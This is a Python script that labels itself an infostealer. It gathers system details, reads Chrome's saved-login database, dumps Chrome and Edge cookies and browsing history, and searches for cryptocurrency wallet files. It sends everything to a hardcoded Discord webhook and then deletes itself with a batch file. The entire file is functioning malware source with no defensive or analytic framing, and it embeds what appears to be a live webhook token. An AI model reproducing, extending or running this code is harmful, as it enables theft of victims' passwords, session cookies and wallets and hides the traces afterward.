import os
import sys
import socket
import subprocess
import sqlite3
import json
import shutil
import platform
from pathlib import Path
from urllib.request import urlopen, Request
from urllib.error import URLError

# --- Configuration ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1546874268149620806/GqZUiOIUuBrvSpPaEDskbdCt6yEijqlI82Ys1YtAjv818kkywiI9Pl6bCnUX5xPJ8vbp"

# --- Dependency Management ---
def install_psutil():
    """Installs psutil if not present."""
    try:
        import psutil
        return True
    except ImportError:
        print("[!] psutil not found. Installing...")
        try:
            # Use subprocess to install psutil in the background
            subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil", "--quiet"])
            print("[+] psutil installed successfully.")
            return True
        except Exception as e:
            print(f"[!] Failed to install psutil: {e}")
            return False

# Try to install if needed
if not install_psutil():
    print("[!] Continuing without psutil. Some data might be missing.")
    import psutil

# --- Data Collection Functions ---

def get_ip():
    """Retrieves the public IP address."""
    try:
        ip = urlopen(Request('https://api.ipify.org', method='GET')).read().decode()
        return ip
    except:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unknown"

def get_system_info():
    """Gathers OS, hardware, and software info."""
    info = {
        "ip": get_ip(),
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "user": os.getenv('USERNAME'),
        "architecture": platform.machine(),
        "installed_software": [],
        "drives": []
    }
    
    # Get installed software
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall", 0, winreg.KEY_READ)
        i = 0
        while True:
            try:
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name, 0, winreg.KEY_READ)
                try:
                    display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    if display_name:
                        info["installed_software"].append(display_name)
                except FileNotFoundError:
                    pass
                winreg.CloseKey(subkey)
                i += 1
            except OSError:
                break
    except Exception as e:
        info["installed_software"].append(f"Error getting software: {e}")

    # Get drives
    try:
        for drive in psutil.disk_partitions():
            info["drives"].append(f"{drive.device} ({drive.mountpoint})")
    except Exception as e:
        info["drives"].append(f"Error getting drives: {e}")

    return info

def get_chrome_passwords():
    """Extracts Chrome passwords (raw data, decryption may require DPAPI)."""
    chrome_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
    login_data_path = os.path.join(chrome_path, "Login Data")
    
    if not os.path.exists(login_data_path):
        return []

    temp_login = os.path.join(os.environ['TEMP'], "temp_login.db")
    try:
        shutil.copy2(login_data_path, temp_login)
    except Exception:
        return []

    passwords = []
    try:
        conn = sqlite3.connect(temp_login)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, user, password = row
            passwords.append({
                "url": url,
                "user": user,
                "password": password.decode('utf-8', errors='ignore') if isinstance(password, bytes) else password
            })
        conn.close()
    except Exception:
        pass
    finally:
        if os.path.exists(temp_login):
            os.remove(temp_login)
            
    return passwords

def get_browsers():
    """Gathers cookies and history from Chromium-based browsers."""
    data = {}
    browsers_to_check = [
        ("Google", "Chrome"),
        ("Google", "Chrome Beta"),
        ("Google", "Chrome Canary"),
        ("Microsoft", "Edge")
    ]
    
    for vendor, browser in browsers_to_check:
        user_data_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", vendor, browser, "User Data")
        if os.path.exists(user_data_path):
            # Cookies
            cookies_path = os.path.join(user_data_path, "Default", "Cookies")
            if os.path.exists(cookies_path):
                temp_cookies = os.path.join(os.environ['TEMP'], "temp_cookies.db")
                shutil.copy2(cookies_path, temp_cookies)
                try:
                    conn = sqlite3.connect(temp_cookies)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, value, host_key FROM cookies")
                    cookies = cursor.fetchall()
                    data[f"{vendor}_{browser}_cookies"] = cookies
                    conn.close()
                except:
                    pass
                finally:
                    if os.path.exists(temp_cookies):
                        os.remove(temp_cookies)
            
            # History
            history_path = os.path.join(user_data_path, "Default", "History")
            if os.path.exists(history_path):
                temp_history = os.path.join(os.environ['TEMP'], "temp_history.db")
                shutil.copy2(history_path, temp_history)
                try:
                    conn = sqlite3.connect(temp_history)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count FROM urls")
                    history = cursor.fetchall()
                    data[f"{vendor}_{browser}_history"] = history
                    conn.close()
                except:
                    pass
                finally:
                    if os.path.exists(temp_history):
                        os.remove(temp_history)

    return data

def get_wallets():
    """Checks for common crypto wallet files."""
    wallets = []
    wallet_paths = [
        "AppData\\Roaming\\Bitcoin\\wallet.dat",
        "AppData\\Roaming\\Litecoin\\wallet.dat",
        "AppData\\Roaming\\Ethereum\\keystore",
        "AppData\\Roaming\\Monero\\wallets",
        "AppData\\Roaming\\Zcash\\wallets",
        "AppData\\Roaming\\Dash\\wallets",
        "AppData\\Roaming\\XMR\\wallets",
        "AppData\\Roaming\\TronLink\\wallets",
        "AppData\\Roaming\\MetaMask\\keystores"
    ]
    
    for wallet in wallet_paths:
        full_path = os.path.join(os.environ['USERPROFILE'], wallet)
        if os.path.exists(full_path):
            wallets.append(full_path)
            
    return wallets

def format_message():
    """Formats collected data into a Discord-friendly message."""
    info = get_system_info()
    browser_data = get_browsers()
    passwords = get_chrome_passwords()
    wallets = get_wallets()
    
    messages = []
    current_message = f"**System Info:**\n"
    current_message += f"- **IP:** {info['ip']}\n"
    current_message += f"- **Hostname:** {info['hostname']}\n"
    current_message += f"- **OS:** {info['os']}\n"
    current_message += f"- **User:** {info['user']}\n"
    current_message += f"- **Architecture:** {info['architecture']}\n\n"
    
    if info['installed_software']:
        current_message += "**Installed Software:**\n"
        for software in info['installed_software'][:10]:
            current_message += f"- {software}\n"
        if len(info['installed_software']) > 10:
            current_message += f"... and {len(info['installed_software']) - 10} more\n"
        current_message += "\n"
    
    if info['drives']:
        current_message += "**Drives:**\n"
        for drive in info['drives']:
            current_message += f"- {drive}\n"
        current_message += "\n"
    
    if passwords:
        current_message += "**Chrome Passwords:**\n"
        for pwd in passwords[:10]:
            current_message += f"- **URL:** {pwd['url']}\n"
            current_message += f"  - **User:** {pwd['user']}\n"
            current_message += f"  - **Pass:** {pwd['password']}\n\n"
        if len(passwords) > 10:
            current_message += f"... and {len(passwords) - 10} more\n\n"
    
    if wallets:
        current_message += "**Crypto Wallets Found:**\n"
        for wallet in wallets:
            current_message += f"- {wallet}\n"
        current_message += "\n"
    
    if browser_data:
        current_message += "**Browser Data:**\n"
        for browser, data in browser_data.items():
            current_message += f"- **{browser}:** {len(data)} entries\n"
        current_message += "\n"

    # Split into chunks if necessary
    while len(current_message) > 2000:
        split_index = current_message.rfind("\n", 0, 2000)
        if split_index == -1:
            split_index = 2000
        messages.append(current_message[:split_index])
        current_message = current_message[split_index:].lstrip("\n")
    if current_message.strip():
        messages.append(current_message)

    return messages

def send_to_discord(messages):
    """Sends the messages to the Discord webhook."""
    for msg in messages:
        try:
            payload = {
                "content": msg
            }
            data = json.dumps(payload).encode('utf-8')
            req = Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'}, method='POST')
            response = urlopen(req)
            return response.read()
        except Exception as e:
            return f"Error sending message: {e}"
    return "No messages to send."

def delete_self():
    """Deletes the script file after a short delay."""
    script_path = os.path.abspath(__file__)
    batch_script = f"del \"{script_path}\" /f /q"
    try:
        # Create a batch file to delete the script
        with open(f"{script_path}.bat", "w") as f:
            f.write(batch_script)
        
        # Run the batch file in the background
        subprocess.Popen(f"cmd /c {script_path}.bat", shell=True)
        # Remove the batch file immediately
        os.remove(f"{script_path}.bat")
    except Exception as e:
        print(f"[!] Failed to delete self: {e}")

def main():
    print(f"[+] Infostealer running on {socket.gethostname()}")
    print(f"[+] Target IP: {get_ip()}")
    
    # Format and send message
    messages = format_message()
    result = send_to_discord(messages)
    print(f"[+] Result: {result}")
    
    # Delete self
    print("[+] Deleting self...")
    delete_self()
    print("[+] Done.")

if __name__ == "__main__":
    main()
